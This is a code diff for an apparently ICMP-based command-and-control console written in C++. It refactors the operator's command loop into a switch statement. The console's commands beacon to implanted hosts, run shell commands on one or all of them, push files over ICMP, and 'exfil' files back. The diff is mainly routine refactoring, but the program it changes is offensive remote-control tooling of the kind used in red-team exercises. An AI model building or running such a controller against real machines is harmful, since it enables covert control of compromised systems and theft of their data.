@@ -33,14 +33,42 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 
+enum class user_command_t {
+  PD_HELP,
+  PD_LIST,
+  PD_HOSTS,
+  PD_SET,
+  PD_PING,
+  PD_PINGH,
+  PD_BEACON,
+  PD_RUN,
+  PD_RUNALL,
+  PD_FILE,
+  PD_EXFIL,
+  PD_EXPORT,
+  PD_LOAD,
+  PD_CLEAR,
+  PD_EXIT,
+  PD_NONE
+};
+
+using host_mapping_t = std::map<std::string, std::string>;
+using group_t = std::map<std::string, std::vector<std::string>>;
+
 /** Expected host machines */
-static std::map<std::string, std::string> hosts;
+static host_mapping_t host_database;
 /** Currently connected hosts */
-static std::map<std::string, std::string> active_connections;
+static host_mapping_t active_connections;
 static std::mutex active_connections_mutex;
+
+/** Groups */
+static group_t groups;
 
 /** Currently selected host */
 static std::string cur_host;
+
+/** Currently selected group */
+static std::string cur_group;
 
 /**
  * @brief Calculates checksum of an array of data.
@@ -116,6 +144,26 @@ std::vector<std::string> split_input(std::string &input)
     ret.push_back(s);
   }
   return ret;
+}
+
+user_command_t input_to_command(const std::string &input)
+{
+  if (input == "help") return user_command_t::PD_HELP;
+  if (input == "list") return user_command_t::PD_LIST;
+  if (input == "hosts") return user_command_t::PD_HOSTS;
+  if (input == "set") return user_command_t::PD_SET;
+  if (input == "ping") return user_command_t::PD_PING;
+  if (input == "pingh") return user_command_t::PD_PINGH;
+  if (input == "beacon") return user_command_t::PD_BEACON;
+  if (input == "run") return user_command_t::PD_RUN;
+  if (input == "runall") return user_command_t::PD_RUNALL;
+  if (input == "file") return user_command_t::PD_FILE;
+  if (input == "exfil") return user_command_t::PD_EXFIL;
+  if (input == "export") return user_command_t::PD_EXPORT;
+  if (input == "load") return user_command_t::PD_LOAD;
+  if (input == "clear") return user_command_t::PD_CLEAR;
+  if (input == "exit") return user_command_t::PD_EXIT;
+  return user_command_t::PD_NONE;
 }
 
 /**
@@ -428,10 +476,19 @@ void load_connections(const std::string &filename)
   if (file.is_open()) {
     std::string host, ip;
     while (file >> host >> ip) {
-      hosts[host] = ip;
+      host_database[host] = ip;
     }
     file.close();
   }
+}
+
+std::ostream &operator<<(std::ostream &os, const host_mapping_t &mapping)
+{
+  auto it = mapping.begin();
+  for (; it != mapping.end(); it++) {
+    os << it->first << ": " << it->second << "\n";
+  }
+  return os;
 }
 
 /**
@@ -494,26 +551,28 @@ int main(int argc, char **argv)
     // split input by spaces and save into an vector
     auto input_arr = split_input(input);
 
-    if (input_arr.at(0).compare("help") == 0) {
+    // get command type
+    auto user_command = input_to_command(input_arr.at(0));
+
+    switch (user_command) {
+    case user_command_t::PD_HELP: {
       help();
-    } else if (input_arr.at(0).compare("list") == 0) {
+      break;
+    }
+    case user_command_t::PD_LIST: {
       // lists active hosts
       std::puts("Listing active machines!");
       std::lock_guard<std::mutex> guard(active_connections_mutex);
-
-      auto it = active_connections.begin();
-      for (; it != active_connections.end(); it++) {
-        std::cout << it->first << ": " << it->second << "\n";
-      }
-    } else if (input_arr.at(0).compare("hosts") == 0) {
+      std::cout << active_connections;
+      break;
+    }
+    case user_command_t::PD_HOSTS: {
       // lists hosts that have been loaded from a file
       std::puts("Listing host machines!");
-
-      auto it = hosts.begin();
-      for (; it != hosts.end(); it++) {
-        std::cout << it->first << ": " << it->second << "\n";
-      }
-    } else if (input_arr.at(0).compare("set") == 0) {
+      std::cout << host_database;
+      break;
+    }
+    case user_command_t::PD_SET: {
       // set host to execute commands
       if (input_arr.size() < 2) {
         std::puts("usage: set [host]");
@@ -524,7 +583,9 @@ int main(int argc, char **argv)
         continue;
       }
       cur_host = input_arr.at(1);
-    } else if (input_arr.at(0).compare("ping") == 0) {
+      break;
+    }
+    case user_command_t::PD_PING: {
       // ping an individual host by ip
       if (input_arr.size() < 2) {
         std::puts("usage: ping [ip]");
@@ -532,7 +593,9 @@ int main(int argc, char **argv)
       }
       ping(input_arr.at(1));
       std::cout << "Sending ping to: " << input_arr.at(1) << "\n";
-    } else if (input_arr.at(0).compare("pingh") == 0) {
+      break;
+    }
+    case user_command_t::PD_PINGH: {
       // ping an individual host by hostname
       if (input_arr.size() < 2) {
         std::puts("usage: pingh [host]");
@@ -541,16 +604,20 @@ int main(int argc, char **argv)
       std::string ip = active_connections[input_arr.at(1)];
       ping(ip);
       std::cout << "Sending ping to: " << ip << "\n";
-    } else if (input_arr.at(0).compare("beacon") == 0) {
+      break;
+    }
+    case user_command_t::PD_BEACON: {
       // send a ping to all hosts in the host file
       std::lock_guard<std::mutex> guard(active_connections_mutex);
       active_connections.clear();
-      auto it = hosts.begin();
-      for (; it != hosts.end(); it++) {
+      auto it = host_database.begin();
+      for (; it != host_database.end(); it++) {
         std::cout << "Beaconing: " << it->second << "\n";
         ping(it->second);
       }
-    } else if (input_arr.at(0).compare("run") == 0) {
+      break;
+    }
+    case user_command_t::PD_RUN: {
       // run a command on a host by hostname
       if (input_arr.size() < 2) {
         std::puts("usage: run [command]");
@@ -570,7 +637,9 @@ int main(int argc, char **argv)
                 << ip
                 << "\n";
       send_command(ip, command);
-    } else if (input_arr.at(0).compare("runall") == 0) {
+      break;
+    }
+    case user_command_t::PD_RUNALL: {
       // run a command on all hosts
       if (input_arr.size() < 2) {
         std::puts("usage: runall [command]");
@@ -593,7 +662,9 @@ int main(int argc, char **argv)
                   << "\n";
         send_command(it->second, command);
       }
-    } else if (input_arr.at(0).compare("file") == 0) {
+      break;
+    }
+    case user_command_t::PD_FILE: {
       // send a file over ICMP to host
       if (input_arr.size() < 3) {
         std::puts("usage: file [src] [dst]");
@@ -605,7 +676,9 @@ int main(int argc, char **argv)
                 << ip
                 << "\n";
       send_file(ip, input_arr.at(1), input_arr.at(2));
-    } else if (input_arr.at(0).compare("exfil") == 0) {
+      break;
+    }
+    case user_command_t::PD_EXFIL: {
       // exfiltrate a file from a host
       if (input_arr.size() < 3) {
         std::puts("usage: exfil [src] [dst]");
@@ -617,7 +690,9 @@ int main(int argc, char **argv)
                 << ip
                 << "\n";
       receive_file(ip, input_arr.at(1), input_arr.at(2));
-    } else if (input_arr.at(0).compare("export") == 0) {
+      break;
+    }
+    case user_command_t::PD_EXPORT: {
       // export currently connected hosts to a file
       std::string filename;
       if (input_arr.size() > 1) {
@@ -628,7 +703,9 @@ int main(int argc, char **argv)
       }
       std::cout << "Exporting to: " << filename << "\n";
       export_connections(filename);
-    } else if (input_arr.at(0).compare("load") == 0) {
+      break;
+    }
+    case user_command_t::PD_LOAD: {
       // load a host config from a filename
       if (input_arr.size() < 2) {
         std::puts("usage: load [filename]");
@@ -636,13 +713,21 @@ int main(int argc, char **argv)
       }
       std::cout << "Loading from: " << input_arr.at(1) << "\n";
       load_connections(input_arr.at(1));
-    } else if (input_arr.at(0).compare("clear") == 0) {
+      break;
+    }
+    case user_command_t::PD_CLEAR: {
       // clear the currently connected hosts
       std::puts("Clearing active connections");
       std::lock_guard<std::mutex> guard(active_connections_mutex);
       active_connections.clear();
-    } else if (input_arr.at(0).compare("exit") == 0) {
       break;
+    }
+    case user_command_t::PD_EXIT: {
+      exit(0);
+    }
+    default: {
+      break;
+    }
     }
   }
 
